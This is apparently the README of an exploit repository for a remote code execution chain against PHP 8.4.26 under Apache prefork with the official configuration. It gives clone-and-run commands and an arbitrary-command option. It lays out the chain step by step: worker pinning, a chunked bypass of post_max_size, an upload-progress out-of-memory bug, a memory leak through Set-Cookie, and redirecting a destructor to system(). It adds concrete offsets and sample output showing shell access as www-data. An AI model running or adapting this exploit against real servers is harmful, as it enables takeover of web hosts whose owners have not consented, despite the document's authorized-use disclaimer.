# php2shell - Official environment, no `display_errors` needed, `memory_limit` untouched

[中文](README.md) | English

**Official prefork configuration (MaxRequestWorkers=150).** In a fully
remote, HTTP-only setting, with only `<?php echo "OK\n"; ?>` on the target
page and no PHP written on the target side, one command reaches RCE:

- stock official image + official ini + official workers: **10/10**
- single-worker baseline (early calibration/debugging): **20/20**
- about 3-4 seconds per run (including 149 held connections); the pinned
  worker is not restarted and the target ini is left untouched

# General exploitation

In principle, once you compute the offsets for every PHP version and fuzz
with them in bulk, one of those fuzz runs will eventually reach RCE.
Besides, a crashed worker restarts anyway, so there is no fear of knocking
the target offline.

As for workers: the official prefork `MaxRequestWorkers=150` setup is now
supported too. The script holds 149 workers with incomplete requests and
pins A1/B1/A2/B2 to the one remaining child; the single-worker setup was
only an early debug form (`--workers 1` still reproduces it).

## Quick start (official php.ini-production / display_errors=Off / 128M)

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) Start the target: stock official image; the container only copies the
#    official php.ini-production to php.ini.
./pure/run_pure.sh
# target: OK
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M
# workers: official (run exploit with --workers 150)

# 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
python3 exploit.py --port 18110
#       pinned 150/150 workers (149 holders)
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No PHP/Apache build, no image build, no gdb, no ini changes.
`pure/run_pure.sh` uses container `p2s-pure-18110` on port `18110` by
default with the image's official prefork configuration
(MaxRequestWorkers=150), and prints the effective ini and MPM values.
`--single` mounts the non-official one-worker override
`pure/docker/apache-single-worker.conf` instead (use it with `--workers 1`);
`docker/apache.conf` is only a compatibility symlink to that file for
older harnesses. On Linux without docker-group access the script falls back
to `sudo docker`; you can also force
`DOCKER="sudo docker" ./pure/run_pure.sh`. `--dbg` only switches to the
symbolic build of the same official version for offline calibration.

Common options:

```bash
# Re-test with fresh ASLR (restart the container)
python3 exploit.py --port 18110 --restart p2s-pure-18110

# Official workers are the default; --workers 1 is for a --single target
python3 exploit.py --port 18110 --workers 1

# Arbitrary command: write a script into the mounted directory, then run sh
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

`--retries` defaults to 3. If the most common pointer in an OOB window is
not `zval_ptr_dtor`, the script rejects that leak via the plausible
`libphp-main` delta check and reruns the whole chain.

## The pure-HTTP chain

The target page is only `<?php echo "OK\n"; ?>`; the attack traffic is
chunked multipart plus ordinary GET/POST:

0. **Worker pinning**: with the official `MaxRequestWorkers=150`, the script
   first holds 149 children with incomplete POST bodies, so A1/B1/A2/B2 all
   land on the one remaining child and the cross-request dangling pointers
   stay valid.
1. **Chunked bypass of `post_max_size`**: without `Content-Length`,
   `content_length=0`, so the check at the top of
   `rfc1867_post_handler` is skipped; bodies far larger than 8M can be
   used for heap shaping.
2. **A1**: 860 depth-64 nested file fields + fillers + large values + a
   4000B `PHP_SESSION_UPLOAD_PROGRESS`, causing an OOM inside
   `php_url_encode` during END cleanup. The bailout leaves dangling
   `PS(id)` / `PS(mod_data)` and `send_cookie=1`.
3. **B1 (OOB read)**: after a safe close, `PS(id)` points at a forged
   `zend_string` header (len=0xC8000, data containing `/`), and
   `Set-Cookie` encodes 800KB of memory starting at the id chunk. The
   window contains:
   - 2MiB-aligned chunk pointer clusters -> id chunk / main chunk base;
   - the hole left by `G:400` at the tail of the id chunk is filled by
     900 nested-array fields; the real HashTables' `pDestructor =
     zval_ptr_dtor` appears 1095 times -> `libphp = value - 0x65EB60`.
4. **A2 + B2**: cheap-OOM points `PS(hash_serialize_verifier)` into the
   heap (`main+0x7D720`); B2 overwrites it with a 384B reference value
   that points at a zval at `S=main+0xF8398`. The fake zend_array at S
   has `pDestructor = zif_system` (`libphp+0x465370`); during shutdown
   `zend_hash_destroy` calls `system("id>/out/p1")`.

Offsets (this build, ASLR-independent):

| Symbol/location | Value |
|---|---|
| `zval_ptr_dtor` | `libphp+0x65EB60` |
| `zif_system` | `libphp+0x465370` |
| fake array `S` | `main+0xF8398` |
| A2 `hsv` | `main+0x7D720` |

Target environment: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26
NTS mod_php, files session handler. A different PHP build/version needs
fresh offsets; ASLR changes per container start, and the two leaks in the
chain derive it at runtime.

## Evidence

- Mechanism and calibration: [pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- Full-chain script: [exploit.py](exploit.py) (`pure/pwn_pure.py` remains as an alias)
- Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- Official-worker log: [pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
- Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## Legacy (not the target)

The early `exploit.py` used a **custom** `docker/php.ini`
(`display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`). It is
unrelated to the official-config target above and is archived at
[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py); the docs in
the same directory, such as
[HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md) and
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md), describe that
line. The old `docker/php.ini`, `docker/docker-compose.yml`,
`docker/offsets.py`, and `lab/apache2_aslr.conf` are archived under
`archive/legacy-8m/docker|lab/` too; the current `docker/` keeps only the
compatibility symlinks `apache.conf` and `www` pointing into `pure/docker/`,
where the real single-worker override and target page live.

## Reproduction statement

- The target configuration is the official `php.ini-production`
  (`display_errors=Off`, `memory_limit=128M`) with the official prefork
  workers (MaxRequestWorkers=150): no custom ini, no `display_errors=On`
  dependency, no target-side files, no `session_start()`, and no gdb on the
  delivery path.
- For vulnerability research and reproduction in authorized environments
  only.
